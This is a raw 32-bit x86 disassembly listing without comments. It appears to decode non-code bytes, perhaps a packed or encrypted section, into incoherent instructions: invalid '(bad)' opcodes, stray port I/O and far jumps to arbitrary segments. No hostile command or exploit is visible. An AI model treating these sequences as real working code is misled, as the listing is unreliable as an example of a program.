  416497:	call   DWORD PTR [edi+0x6b]
  41649a:	and    eax,0xdf3263e6
  41649f:	jp     0x416474
  4164a1:	in     al,0x1d
  4164a3:	xor    eax,DWORD PTR [esi-0x75d533b9]
  4164a9:	add    dh,BYTE PTR gs:[edx+0x19d92489]
  4164b0:	inc    edx
  4164b1:	sbb    ebp,ebx
  4164b3:	mov    cl,BYTE PTR [edx-0x59]
  4164b6:	pop    eax
  4164b7:	imul   esp,DWORD PTR [ecx+0x31f3957a],0xb6088d90
  4164c1:	adc    cl,BYTE PTR [eax+0x4ab80c97]
  4164c7:	clc    
  4164c8:	lods   eax,DWORD PTR ds:[esi]
  4164c9:	test   BYTE PTR [eax+0xc0f9e0a],ch
  4164cf:	call   0x314b:0x7e760150
  4164d6:	add    dl,dh
  4164d8:	mov    ah,0x76
  4164da:	int3   
  4164db:	mov    ch,0xf5
  4164dd:	jo     0x416526
  4164df:	mov    cl,BYTE PTR [ebp-0x3e]
  4164e2:	ficomp DWORD PTR [ebx-0x5c7b7b9b]
  4164e8:	sub    ah,BYTE PTR [ebp-0x78]
  4164eb:	in     eax,dx
  4164ec:	xchg   BYTE PTR [eax+0xb],ah
  4164ef:	aaa    
  4164f0:	xchg   ebp,eax
  4164f1:	lods   al,BYTE PTR ds:[esi]
  4164f2:	retf   0xb03b
  4164f5:	mov    edi,0x2a1f2bfa
  4164fa:	mov    eax,ds:0xb36c9846
  4164ff:	xor    al,0x28
  416501:	std    
  416502:	inc    edi
  416503:	fst    QWORD PTR [ebp-0x2c4eff63]
  416509:	jg     0x4164cc
  41650b:	sub    ebx,DWORD PTR [esi+ecx*8]
  41650e:	cmp    al,0x15
  416510:	xchg   esp,eax
  416511:	jne    0x416585
  416513:	cld    
  416514:	mov    cl,0x7d
  416516:	xchg   WORD PTR [esi+eax*1+0xcd072c9],si
  41651e:	push   cs
  41651f:	jnp    0x4164a8
  416521:	mov    esi,DWORD PTR [edx-0x2f]
  416524:	xchg   edi,eax
  416525:	xchg   al,al
  416527:	mov    ecx,0x1ffa458a
  41652c:	inc    ebp
  41652d:	pop    bp
  41652f:	mov    es,eax
  416531:	stos   BYTE PTR es:[edi],al
  416532:	jmp    DWORD PTR [edi]
  416534:	sti    
  416535:	pop    ebx
  416536:	outs   dx,BYTE PTR ds:[esi]
  416537:	js     0x416551
  416539:	xor    al,0xc
  41653b:	inc    ebx
  41653c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41653d:	xchg   esi,eax
  41653e:	lods   al,BYTE PTR ds:[esi]
  41653f:	mov    edx,0x7ae3678a
  416544:	(bad)  
  416546:	inc    edx
  416547:	pop    ds
  416548:	sar    edi,0xd
  41654b:	mov    bh,0x31
  41654d:	and    BYTE PTR [ebp-0x7075646d],ah
  416553:	jge    0x416531
  416555:	add    eax,0x8e7c1ea7
  41655a:	cmp    al,dl
  41655c:	inc    eax
  41655d:	push   esp
  41655e:	and    edi,eax
  416560:	sbb    al,0x91
  416562:	inc    edi
  416563:	cmp    ebx,DWORD PTR [edx+0x5024efdc]
  416569:	adc    esp,ecx
  41656b:	jge    0x41656d
  41656d:	jbe    0x41650b
  41656f:	cs test eax,0xb5377f53
  416575:	test   BYTE PTR [ebx-0x2a475054],ch
  41657b:	cdq    
  41657c:	cmp    al,0x32
  41657e:	or     BYTE PTR [esi-0x1e],bh
  416581:	aaa    
  416582:	test   al,0x79
  416584:	xor    al,0x1
  416586:	lea    esi,es:[edx]
  416589:	cli    
  41658a:	shl    DWORD PTR [ebx],cl
  41658c:	daa    
  41658d:	outs   dx,DWORD PTR ds:[esi]
  41658e:	nop
  41658f:	xor    BYTE PTR [edx],bh
  416591:	inc    edx
  416592:	or     eax,0xf13644ee
  416597:	shl    BYTE PTR ds:0x6c0dad1a,0x2f
  41659e:	int3   
  41659f:	je     0x41660f
  4165a1:	mov    ds:0x9e9323ba,al
  4165a6:	out    dx,eax
  4165a7:	and    cl,bl
  4165a9:	fild   DWORD PTR [esi+ebp*2+0x4]
  4165ad:	xor    BYTE PTR [edi+0x6d35ef49],ch
  4165b3:	inc    esp
  4165b4:	imul   BYTE PTR [eax+eiz*2-0x55]
  4165b8:	in     eax,0x84
  4165ba:	push   0xffffff8c
  4165bc:	inc    edx
  4165bd:	push   0x73
  4165bf:	and    edi,DWORD PTR [ebp*4+0x307e33c9]
  4165c6:	fs dec ebx
  4165c8:	pop    ecx
  4165c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165ca:	frstor [ecx]
  4165cc:	mov    ch,0xad
  4165ce:	mov    al,0x7c
  4165d0:	in     eax,dx
  4165d1:	mov    al,BYTE PTR [edi-0x22ba8dac]
  4165d7:	aad    0xfe
  4165d9:	sar    BYTE PTR [edi+0x64af7a42],cl
  4165df:	push   ebp
  4165e0:	aad    0xa9
  4165e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165e3:	adc    eax,0xb3a9966
  4165e8:	mov    ah,0x2d
  4165ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165eb:	pop    esp
  4165ec:	out    dx,eax
  4165ed:	jl     0x416620
  4165ef:	jo     0x4165b8
  4165f1:	in     al,0xfc
  4165f3:	push   es
  4165f4:	add    DWORD PTR ds:0xa21184de,ebp
  4165fa:	stos   DWORD PTR es:[edi],eax
  4165fb:	test   BYTE PTR [edi-0x28f6d9c2],ah
  416601:	ret    0x2869
  416604:	xor    DWORD PTR [edx+0x14],0xffffff93
  416608:	push   cs
  416609:	cmc    
  41660a:	daa    
  41660b:	pop    esp
  41660c:	pusha  
  41660d:	pop    ecx
  41660e:	xor    BYTE PTR [ebx+0x6],dh
  416611:	xor    BYTE PTR [ebp+0x492a3253],dl
  416617:	inc    ecx
  416618:	outs   dx,DWORD PTR ds:[esi]
  416619:	in     eax,dx
  41661a:	push   eax
  41661b:	jbe    0x416643
  41661d:	sub    al,0x79
  41661f:	mov    ebp,0x64b47598
  416624:	sub    eax,0x1f3b87bf
  416629:	adc    al,0x20
  41662b:	shl    bh,0x7c
  41662e:	mov    edx,0x3842adc1
  416633:	or     ebp,DWORD PTR [esi+0x4ddc7250]
  416639:	data16 and BYTE PTR [ebx+0x30],dh
  41663d:	dec    ebx
  41663e:	lods   al,BYTE PTR ds:[esi]
  41663f:	mov    BYTE PTR [ecx+0x70948637],ch
  416645:	cmp    dh,BYTE PTR [edi-0x1256383e]
  41664b:	and    edx,DWORD PTR [eax-0x418e6885]
  416651:	cmp    BYTE PTR [eax],bl
  416653:	jmp    0x2174:0x110e1b24
  41665a:	mov    WORD PTR [esi+0x3a],?
  41665d:	pop    esi
  41665e:	sub    al,0x96
  416660:	push   ss
  416661:	xor    eax,0xd2ff4631
  416666:	imul   ebx,DWORD PTR [ebx+0x3a5d83dc],0x5c
  41666d:	jnp    0x4166cf
  41666f:	pusha  
  416670:	jp     0x416657
  416672:	jns    0x41660a
  416674:	int    0x5a
  416676:	cdq    
  416677:	not    edi
  416679:	adc    bh,cl
  41667b:	hlt    
  41667c:	punpckhdq mm7,QWORD PTR [esi+0x51]
  416680:	push   ecx
  416681:	(bad)  
  416682:	aad    0x90
  416684:	sub    eax,DWORD PTR [eax+0x4b]
  416687:	push   0x628d9610
  41668c:	push   ebx
  41668d:	jnp    0x4166d4
  41668f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416690:	jle    0x4166b4
  416692:	xor    eax,0x807a0bc7
  416697:	ins    BYTE PTR es:[edi],dx
  416698:	rcl    DWORD PTR [edx+0x4886c13a],0x63
  41669f:	sub    DWORD PTR [eax],eax
  4166a1:	ror    BYTE PTR [eax+0x3c9a95af],cl
  4166a7:	add    dh,BYTE PTR [edi-0x69]
  4166aa:	and    eax,0x8cc6f0e4
  4166af:	jl     0x416709
  4166b1:	out    0x95,al
  4166b3:	mov    ch,0x27
  4166b5:	test   eax,0x9a86dbb2
  4166ba:	out    0xbb,eax
  4166bc:	pop    ebx
  4166bd:	or     al,0xb1
  4166bf:	inc    ecx
  4166c0:	jg     0x416724
  4166c2:	pop    ds
  4166c3:	loop   0x4166b0
  4166c5:	jb     0x416711
  4166c7:	jno    0x41673b
  4166c9:	test   eax,0x2743c764
  4166ce:	sbb    al,0x62
  4166d0:	sub    DWORD PTR [eax],ecx
  4166d2:	(bad)
  4166d6:	imul   edi,DWORD PTR [ecx],0xffffffb7
  4166d9:	aaa    
  4166da:	xlat   BYTE PTR ds:[ebx]
  4166db:	js     0x4166b7
  4166dd:	sbb    ebx,esi
  4166df:	adc    BYTE PTR [edx],dl
  4166e1:	mov    al,ds:0xa82126ce
  4166e6:	ds xor bh,bh
  4166e9:	ja     0x41669d
  4166eb:	sub    eax,0xcb7a80c4
  4166f0:	add    eax,0x2d398405
  4166f5:	push   0x60ea78c4
  4166fa:	adc    BYTE PTR [esi],dl
  4166fc:	std    
  4166fd:	dec    ebp
  4166fe:	dec    ebx
  4166ff:	addr16 jl 0x4166e4
  416702:	out    0x6b,eax
  416704:	sti    
  416705:	das    
  416706:	loop   0x41668e
  416708:	push   0x1b6d1621
  41670d:	hlt    
  41670e:	pop    esi
  41670f:	lods   al,BYTE PTR ds:[esi]
  416710:	ins    DWORD PTR es:[edi],dx
  416711:	push   edi
  416712:	pop    edi
  416713:	call   0x2000:0x9cb6d492
  41671a:	mov    WORD PTR [esp+esi*2-0x487a7b66],?
  416721:	xchg   BYTE PTR [ebp-0x2ca33e3d],ah
  416727:	cld    
  416728:	mov    al,0x8a
  41672a:	test   eax,0xc7705b61
  41672f:	outs   dx,BYTE PTR ds:[esi]
  416730:	jg     0x4166de
  416732:	push   ecx
  416733:	or     eax,0xa0e08354
  416738:	sbb    edx,DWORD PTR [ebx+0x2a75bdba]
  41673e:	pop    ebp
  41673f:	push   cs
  416740:	fwait
  416741:	retf   
  416742:	dec    esp
  416743:	pop    ds
  416744:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416745:	ja     0x416795
  416747:	data16 mov bl,BYTE PTR [esi]
  41674a:	mov    esp,0xe25cf260
  41674f:	sub    al,0x94
  416751:	mov    es,WORD PTR [edx+0x37]
  416754:	jg     0x4167c4
  416756:	xchg   edx,eax
  416757:	add    ch,BYTE PTR [esi]
  416759:	das    
  41675a:	ins    DWORD PTR es:[edi],dx
  41675b:	xor    BYTE PTR [ebx],ch
  41675d:	in     eax,0xd7
  41675f:	mov    BYTE PTR [edi+0x754115f0],cl
  416765:	dec    edx
  416766:	xor    dl,BYTE PTR [ecx]
  416768:	mov    ah,0xf9
  41676a:	neg    DWORD PTR [esi]
  41676c:	pop    eax
  41676d:	daa    
  41676e:	mov    ecx,0x216ca48e
  416773:	nop
  416774:	push   cs
  416775:	ja     0x4166f7
  416777:	push   ebx
  416778:	nop
  416779:	dec    ebp
  41677a:	cdq    
  41677b:	ins    BYTE PTR es:[edi],dx
  41677c:	test   eax,0xd5d3b204
  416781:	aad    0xe6
  416783:	mov    eax,0x5187730a
  416788:	xchg   edi,eax
  416789:	retf   0xd19b
  41678c:	fdivr  st(1),st
  41678e:	retf   0x8947
  416791:	iret   
  416792:	push   es
  416793:	ret    
  416794:	sub    DWORD PTR [ebp+ebx*1+0x41],edi
  416798:	xor    eax,0x522b1bde
  41679d:	pop    ecx
  41679e:	jo     0x416770
  4167a0:	mov    ds:0xa8153d27,al
  4167a5:	div    esi
  4167a7:	jno    0x4167e5
  4167a9:	lea    esi,[ebp+0x74]
  4167ac:	mov    esi,0x74d0e245
  4167b1:	lock iret 
  4167b3:	out    0x46,al
  4167b5:	mov    al,0x14
  4167b7:	and    eax,DWORD PTR [eax-0xb9dead4]
  4167bd:	jecxz  0x416778
  4167bf:	pop    ebp
  4167c0:	daa    
  4167c1:	(bad)  
  4167c2:	mov    esp,0x601cb4b8
  4167c7:	sbb    al,0xeb
  4167c9:	retf   
  4167ca:	shl    eax,0x81
  4167cd:	xor    BYTE PTR [eax],0xfa
  4167d0:	push   eax
  4167d1:	jp     0x4167a8
  4167d3:	xchg   ebx,eax
  4167d4:	or     BYTE PTR [esi-0x685b079b],cl
  4167da:	jnp    0x41677d
  4167dc:	aaa    
  4167dd:	aad    0x5e
  4167df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167e0:	loope  0x41677b
  4167e2:	imul   ebx,DWORD PTR [ecx+eax*2-0x22a11794],0x7b58e91c
  4167ed:	sub    ah,BYTE PTR [ecx]
  4167ef:	mov    esp,0x92522eb3
  4167f4:	test   eax,0x4d6604b5
  4167f9:	test   cl,0x95
  4167fc:	sub    BYTE PTR [ebp+0x4d2b4ab2],bh
  416802:	xchg   esp,eax
  416803:	das    
  416804:	xchg   edi,eax
  416805:	sbb    esi,DWORD PTR [ebx+0x41e25129]
  41680b:	test   al,0x2e
  41680d:	mov    cl,BYTE PTR [edi]
  41680f:	sbb    DWORD PTR [esi],ebx
  416811:	loopne 0x41683a
  416813:	xchg   esi,eax
  416814:	cmp    cl,bh
  416816:	in     eax,0x65
  416818:	xchg   ebx,eax
  416819:	sub    edx,DWORD PTR [edi+eiz*4+0x65]
  41681d:	shl    BYTE PTR [ebx],cl
  41681f:	or     eax,0x1a78784f
  416824:	xchg   edi,eax
  416825:	outs   dx,DWORD PTR ds:[esi]
  416826:	add    al,0x9c
  416828:	retf   
  416829:	mov    bh,0x72
  41682b:	pop    es
  41682c:	inc    ebx
  41682d:	retf   
  41682e:	sbb    edx,DWORD PTR [edi-0x5deb548]
  416834:	dec    edi
  416835:	ja     0x4167e3
  416837:	je     0x4167d1
  416839:	in     eax,dx
  41683a:	dec    edx
  41683b:	mov    eax,ds:0x2cff3652
  416840:	es push ebx
  416842:	scas   eax,DWORD PTR es:[edi]
  416843:	enter  0xb60f,0x26
  416847:	mov    ebp,DWORD PTR [ecx+0x480f2bc]
  41684d:	das    
  41684e:	mov    ebp,0x9e2c3571
  416853:	cmc    
  416854:	loop   0x4168bd
  416856:	add    eax,0xa7c4d2b9
  41685b:	loope  0x416859
  41685d:	mov    ebx,0x30ae59b4
  416862:	and    eax,0xca28920c
  416867:	js     0x4168c6
  416869:	iret   
  41686a:	adc    edx,ecx
  41686c:	push   ss
  41686d:	pop    eax
  41686e:	cmovnp esp,ebp
  416871:	lea    ebp,[esi]
  416873:	adc    dl,dl
  416875:	mov    ah,0x39
  416877:	add    bh,ch
  416879:	mov    ch,0x89
  41687b:	pop    ecx
  41687c:	imul   dh
  41687e:	dec    DWORD PTR [esi-0x44]
  416881:	cmp    bl,BYTE PTR [edi-0x62494bfe]
  416887:	rcr    dh,1
  416889:	pusha  
  41688a:	(bad)  
  41688b:	pop    ds
  41688c:	ins    DWORD PTR es:[edi],dx
  41688d:	and    cl,0x92
  416890:	sbb    al,0x85
  416892:	test   al,0x12
  416894:	pop    ds
  416895:	inc    edx
  416896:	mov    ebp,0x73913b87
  41689b:	dec    edx
  41689c:	cld    
  41689d:	pushf  
  41689e:	xor    DWORD PTR [edi+0xb],eax
  4168a1:	cmp    dh,BYTE PTR [edx+0x68703381]
  4168a7:	pop    esi
  4168a8:	jl     0x41689a
  4168aa:	fs pusha 
  4168ac:	push   esp
  4168ad:	aaa    
  4168ae:	jo     0x4168f1
  4168b0:	dec    edi
  4168b1:	les    edi,FWORD PTR [esi+0x65e728eb]
  4168b7:	cld    
  4168b8:	add    dl,BYTE PTR [ebx]
  4168ba:	fcmovnu st,st(0)
  4168bc:	sti    
  4168bd:	xchg   ebp,eax
  4168be:	in     al,0x57
  4168c0:	xlat   BYTE PTR ds:[ebx]
  4168c1:	sub    eax,0xff106b9a
  4168c6:	or     ecx,edx
  4168c8:	mov    edx,0x50a99d0e
  4168cd:	ja     0x41686c
  4168cf:	push   0x17
  4168d1:	jecxz  0x41690b
  4168d3:	or     BYTE PTR [ecx],0x7b
  4168d6:	ja     0x4168e6
  4168d8:	add    bl,bh
  4168da:	sub    ebp,DWORD PTR [ebx-0x4fd7e661]
  4168e0:	sbb    bh,BYTE PTR [edx]
  4168e2:	adc    BYTE PTR [ebp+0x3eaea8b7],al
  4168e8:	sbb    BYTE PTR [edx+0x4a3ed604],al
  4168ee:	jmp    0x3aac:0x6dffdba4
  4168f5:	sub    eax,0xd5f326ba
  4168fa:	xchg   esp,eax
  4168fb:	dec    eax
  4168fc:	(bad)  
  4168fd:	or     al,0x23
  4168ff:	add    BYTE PTR [edi+0x5785b193],0x26
  416906:	stc    
  416907:	je     0x41695c
  416909:	ja     0x4168d9
  41690b:	lahf   
  41690c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41690d:	push   ebp
  41690e:	iret   
  41690f:	shr    BYTE PTR [eax-0x5ad361fc],cl
  416915:	xchg   DWORD PTR ss:0x8a56fee0,eax
  41691c:	bound  edx,QWORD PTR [edx+0xde0e44]
  416922:	mov    bl,BYTE PTR [ecx+0x27eaa57c]
  416928:	cmp    al,0xe8
  41692a:	add    bh,cl
  41692c:	adc    BYTE PTR [edi-0x6b19a271],dl
  416932:	fimul  DWORD PTR [edx-0x29]
  416935:	mov    dh,0xc9
  416937:	je     0x416926
  416939:	push   DWORD PTR [edx+ebx*8]
  41693c:	and    al,0x45
  41693e:	xor    bh,BYTE PTR [edi+0x72]
  416941:	lahf   
  416942:	or     al,0x4
  416944:	test   eax,0x6e89768c
  416949:	fisubr WORD PTR [edi]
  41694b:	fmul   QWORD PTR [ebp+0x5f]
  41694e:	arpl   WORD PTR [ebp+0x5c83aa95],dx
  416954:	mov    ds:0x140a528b,al
  416959:	dec    ebx
  41695a:	mov    ebx,0xb2f7295d
  41695f:	stc    
  416960:	imul   edi,DWORD PTR [esi+0x59254574],0xe5dbf85c
  41696a:	sub    ax,0x7b45
  41696e:	xchg   edi,eax
  41696f:	sub    cl,ah
  416971:	int    0x99
  416973:	stc    
  416974:	or     eax,0x626828ff
  416979:	imul   cl
  41697b:	mov    dl,BYTE PTR [edx-0x1cd52ac2]
  416981:	retf   0xc2ac
  416984:	(bad)
  416987:	hlt    
  416988:	fdivr  st,st(4)
  41698a:	ftst   
  41698c:	adc    dl,bl
  41698e:	inc    eax
  41698f:	dec    edi
  416990:	jnp    0x4169d7
  416992:	jnp    0x416a10
  416994:	popf   
  416995:	and    DWORD PTR [ecx+ebx*2-0x1e],ebp
  416999:	leave  
  41699a:	jb     0x416989
  41699c:	(bad)  
  41699d:	outs   dx,BYTE PTR ds:[esi]
  41699e:	cmc    
  41699f:	inc    ebx
  4169a0:	xchg   ebp,eax
  4169a1:	(bad)  
  4169a2:	das    
  4169a3:	inc    ebx
  4169a4:	xchg   edi,eax
  4169a5:	mov    edi,0x7672ced5
  4169aa:	push   0xfffffff2
  4169ac:	outs   dx,BYTE PTR ds:[esi]
  4169ad:	shl    BYTE PTR [eax],1
  4169af:	(bad)  
  4169b0:	ins    BYTE PTR es:[edi],dx
  4169b1:	sbb    cl,dl
  4169b3:	add    eax,0xa248c23a
  4169b8:	and    al,0x1d
  4169ba:	push   ds
  4169bb:	dec    ebx
  4169bc:	popf   
  4169bd:	inc    edi
  4169be:	push   esi
  4169bf:	stos   BYTE PTR es:[edi],al
  4169c0:	pop    eax
  4169c1:	scas   al,BYTE PTR es:[edi]
  4169c2:	jne    0x4169d8
  4169c4:	sbb    al,0x2a
  4169c7:	cmp    al,0xca
  4169c9:	or     eax,0x848ddac9
  4169ce:	(bad)  
  4169cf:	js     0x416a41
  4169d1:	jge    0x416967
  4169d3:	loope  0x4169ca
  4169d5:	sbb    eax,0xd7d193d4
  4169da:	push   ss
  4169db:	sti    
  4169dc:	in     eax,dx
  4169dd:	pop    ecx
  4169de:	ror    DWORD PTR [edx],1
  4169e0:	je     0x4169ee
  4169e2:	stos   BYTE PTR es:[edi],al
  4169e3:	fcomp  QWORD PTR [edx-0x79]
  4169e6:	dec    esp
  4169e7:	std    
  4169e8:	mov    fs,WORD PTR [edi-0x56]
  4169eb:	call   0x9f71e4df
  4169f0:	jl     0x416a2a
  4169f2:	sbb    eax,0xe55fcf94
  4169f7:	shr    DWORD PTR [edx+0x3ca66fd7],1
  4169fd:	cmp    ebp,ebp
  4169ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a00:	les    esi,FWORD PTR [edi-0x46]
  416a03:	mov    al,0xb5
  416a05:	pushf  
  416a06:	inc    ecx
  416a07:	sti    
  416a08:	sbb    eax,0x5b93d123
  416a0d:	jnp    0x4169a7
  416a0f:	ins    BYTE PTR es:[edi],dx
  416a10:	sub    eax,0x50f2d706
  416a15:	sar    BYTE PTR [ebx+0x4e],0x70
  416a19:	mov    ds:0x34e7f93a,al
  416a1e:	out    0xb7,eax
  416a20:	pop    eax
  416a21:	push   ss
  416a22:	dec    ebx
  416a23:	loop   0x416a16
  416a25:	ror    eax,0x8a
  416a28:	jp     0x4169ea
  416a2a:	into   
  416a2b:	ror    BYTE PTR [edi-0xb730e66],1
  416a31:	sub    edi,DWORD PTR [eax+0x7681489f]
  416a37:	push   es
  416a38:	dec    ebx
  416a39:	sub    DWORD PTR [esi+0x4cc327a0],0xc344efcd
  416a43:	pop    es
  416a44:	stos   BYTE PTR es:[edi],al
  416a45:	lods   eax,DWORD PTR ds:[esi]
  416a46:	outs   dx,BYTE PTR ds:[esi]
  416a47:	and    eax,0x41656ae
  416a4c:	jae    0x416a0e
  416a4e:	mov    ds:0xcc2f9ec8,eax
  416a53:	int3   
  416a54:	jmp    0xa59b:0x3e6a4679
  416a5b:	xchg   esi,eax
  416a5c:	mov    al,0x19
  416a5e:	idiv   BYTE PTR [edi+0x7f]
  416a61:	lods   eax,DWORD PTR ds:[esi]
  416a62:	iret   
  416a63:	add    esp,ebx
  416a65:	push   ebp
  416a66:	inc    ebp
  416a67:	(bad)  
  416a68:	repnz mov esi,?
  416a6b:	mov    edi,0x35500288
  416a70:	test   DWORD PTR [esi],0xa9f40bae
  416a76:	push   edx
  416a77:	int3   
  416a78:	fwait
  416a79:	pop    esp
  416a7a:	das    
  416a7b:	out    0x67,eax
  416a7d:	cmp    DWORD PTR [edx],ebx
  416a7f:	mov    edx,0x5ebfcb26
  416a84:	mov    ds,WORD PTR [edi+0x78a405bf]
  416a8a:	pop    ebp
  416a8b:	jnp    0x416a60
  416a8d:	shl    DWORD PTR [eax+0xf],0x2a
  416a91:	fdiv   QWORD PTR [ecx+0x5467bf06]
  416a97:	fistp  DWORD PTR ds:0x3e26c917
  416a9d:	das    
  416a9e:	out    dx,al
  416a9f:	test   dl,0x99
  416aa2:	dec    ebx
  416aa3:	jo     0x416a3d
  416aa5:	mov    dl,0xe5
  416aa7:	adc    bl,BYTE PTR [esi-0x5a]
  416aaa:	or     eax,0x7f4d39cf
  416aaf:	aam    0x36
  416ab1:	loop   0x416aba
  416ab3:	pop    eax
  416ab4:	js     0x416af8
  416ab6:	cmp    cl,0xee
  416ab9:	inc    ecx
  416aba:	mov    ebx,0x7f1bdbb2
  416abf:	xor    dl,BYTE PTR [esi+0x6b]
  416ac2:	mov    ah,0x30
  416ac4:	sub    al,0x85
  416ac6:	addr16 cmc 
  416ac8:	push   esp
  416ac9:	mov    bh,0xb7
  416acb:	shl    BYTE PTR [edi],cl
  416acd:	js     0x416b0c
  416acf:	push   ss
  416ad0:	push   edx
  416ad1:	cmp    dh,BYTE PTR [edx]
  416ad3:	call   0xfca0:0xc8b59f9a
  416ada:	or     eax,0x531d6b38
  416adf:	mov    eax,ds:0x459e8428
  416ae4:	mov    ds:0x3bf07046,eax
  416ae9:	repnz sub al,0xc8
  416aec:	add    eax,0xcede6a8d
  416af1:	ins    DWORD PTR es:[edi],dx
  416af2:	(bad)  
  416af3:	add    al,0x46
  416af5:	ins    DWORD PTR es:[edi],dx
  416af6:	jns    0x416b4a
  416af8:	sti    
  416af9:	cdq    
  416afa:	pop    edi
  416afb:	fisttp QWORD PTR [ecx+0x73]
  416afe:	mov    ds:0x6791bc0e,al
  416b03:	jo     0x416a98
  416b05:	push   ecx
  416b06:	jecxz  0x416b29
  416b08:	retf   0x2b
  416b0b:	add    eax,0xe83759af
  416b10:	js     0x416aab
  416b12:	or     eax,0xa67d9af7
  416b17:	repnz sub eax,0x4ae39cf
  416b1d:	clc    
  416b1e:	dec    DWORD PTR [ebx-0x16]
  416b21:	push   eax
  416b22:	pop    ds
  416b23:	jb     0x416b6c
  416b25:	stos   DWORD PTR es:[edi],eax
  416b26:	loop   0x416b46
  416b28:	or     al,0x7b
  416b2a:	loope  0x416afc
  416b2c:	fcomp  QWORD PTR [edi+0x51]
  416b2f:	test   BYTE PTR [edx-0x2d602a16],0xa9
  416b36:	and    DWORD PTR [eax-0x7a101a5f],ebx
  416b3c:	jle    0x416b8c
  416b3e:	xchg   ebx,eax
  416b3f:	jns    0x416b0f
  416b41:	lea    edi,[eax]
  416b43:	push   ebp
  416b44:	fstp   QWORD PTR [esi]
  416b46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b47:	mov    ebp,0x4e72eb67
  416b4c:	and    ebx,DWORD PTR [ebp-0x52]
  416b4f:	sar    bl,cl
  416b51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b52:	aad    0xbe
  416b54:	or     BYTE PTR cs:[ecx],dh
  416b57:	mov    dl,0x7
  416b59:	add    al,0x71
  416b5b:	jae    0x416b43
  416b5d:	scas   eax,DWORD PTR es:[edi]
  416b5e:	mov    al,ss:0x76b3b5a7
  416b64:	imul   eax,DWORD PTR [ebx-0x1e],0xffffffa5
  416b68:	jne    0x416ba8
  416b6a:	pop    edi
  416b6b:	cmp    bl,dl
  416b6d:	xor    bl,BYTE PTR [esi]
  416b6f:	daa    
  416b70:	rol    DWORD PTR [ebp+0x57f31cd0],cl
  416b76:	sbb    bl,BYTE PTR [ebx+ebx*2]
  416b79:	retf   
  416b7a:	jl     0x416ba1
  416b7c:	pop    ebx
  416b7d:	pop    ebx
  416b7e:	aaa    
  416b7f:	call   0xb2cd7639
  416b84:	mov    esp,0x8994aee4
  416b89:	inc    ebx
  416b8a:	dec    edx
  416b8b:	out    0xa,eax
  416b8d:	sub    ebp,DWORD PTR [esi+0x60042d75]
  416b93:	jnp    0x416c06
  416b95:	xchg   esi,eax
  416b96:	imul   edx,eax,0x6f
  416b99:	test   DWORD PTR [eax+0x20],ebx
  416b9c:	pop    ecx
  416b9d:	jno    0x416b8c
  416b9f:	mov    eax,ds:0x8b70d34e
  416ba4:	pop    edx
  416ba5:	mov    al,0xdc
  416ba7:	popf   
  416ba8:	push   ds
  416ba9:	dec    ebp
  416baa:	jge    0x416b46
  416bac:	xchg   edx,eax
  416bad:	push   esi
  416bae:	lods   al,BYTE PTR ds:[esi]
  416baf:	sar    BYTE PTR [esi],1
  416bb1:	jo     0x416be7
  416bb3:	push   es
  416bb4:	fwait
  416bb5:	into   
  416bb6:	retf   0x6562
  416bb9:	ja     0x416c1c
  416bbb:	pop    esi
  416bbc:	and    al,0xd8
  416bbe:	fdivr  st,st(5)
  416bc0:	pop    edx
  416bc1:	ss push eax
  416bc3:	add    BYTE PTR [ebp-0x40321b17],cl
  416bc9:	lea    eax,[esi]
  416bcb:	aam    0xe
  416bcd:	retf   
  416bce:	mov    dl,0xc8
  416bd0:	dec    ecx
  416bd1:	add    eax,0x23893ba3
  416bd6:	(bad)  
  416bd7:	call   0x6828d9a7
  416bdc:	call   0x4149:0x5a76b491
  416be3:	mul    BYTE PTR [ecx+eiz*4]
  416be6:	sbb    cl,BYTE PTR [ebp+0x283dc3a5]
  416bec:	in     eax,dx
  416bed:	or     ah,BYTE PTR [edx-0x15]
  416bf0:	addr16 sub eax,0x252e76b9
  416bf6:	or     DWORD PTR [edi+0x52],ebx
  416bf9:	cmp    ch,BYTE PTR [edx]
  416bfb:	ss inc esi
  416bfd:	(bad)  
  416bfe:	sti    
  416bff:	loop   0x416c1e
  416c01:	fadd   QWORD PTR [ecx]
  416c03:	pop    edi
  416c04:	cs mov bh,0x3a
  416c07:	stos   BYTE PTR es:[edi],al
  416c08:	pop    eax
  416c09:	popa   
  416c0a:	jo     0x416c35
  416c0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c0d:	xlat   BYTE PTR ds:[ebx]
  416c0e:	and    al,0xe7
  416c10:	jmp    0x9c0:0xfe8cf5a1
  416c17:	xor    ah,BYTE PTR [edi-0x64]
  416c1a:	xchg   ebp,eax
  416c1b:	and    al,0x5
  416c1d:	mov    ds:0x8ddae74a,eax
  416c22:	popf   
  416c23:	nop
  416c24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c25:	pop    edi
  416c26:	xor    dh,bh
  416c28:	mov    al,ds:0x1d73305d
  416c2d:	ds jbe 0x416c75
  416c30:	scas   eax,DWORD PTR es:[edi]
  416c31:	dec    eax
  416c32:	lahf   
  416c33:	xchg   ecx,eax
  416c34:	fucomp st(0)
  416c36:	aaa    
  416c37:	js     0x416ca8
  416c39:	pop    ecx
  416c3a:	cld    
  416c3b:	int3   
  416c3c:	shl    edi,cl
  416c3e:	in     al,0xe2
  416c40:	xlat   BYTE PTR ds:[ebx]
  416c41:	lods   eax,DWORD PTR ds:[esi]
  416c42:	push   es
  416c43:	add    eax,DWORD PTR [eax]
  416c45:	and    ah,BYTE PTR [eax]
  416c47:	push   ds
  416c48:	repnz mov dh,0xc9
  416c4b:	jmp    0x5aa1393c
  416c50:	lea    esi,[ebp-0x6f]
  416c53:	fisubr WORD PTR [eax+0x514cc90b]
  416c59:	xchg   ebx,eax
  416c5a:	pop    ebp
  416c5b:	push   cs
  416c5c:	mov    ebx,0x18b39d3c
  416c61:	and    al,0x47
  416c63:	sbb    al,0xb5
  416c65:	or     bl,cl
  416c67:	ds ret 
  416c69:	inc    ebp
  416c6a:	int3   
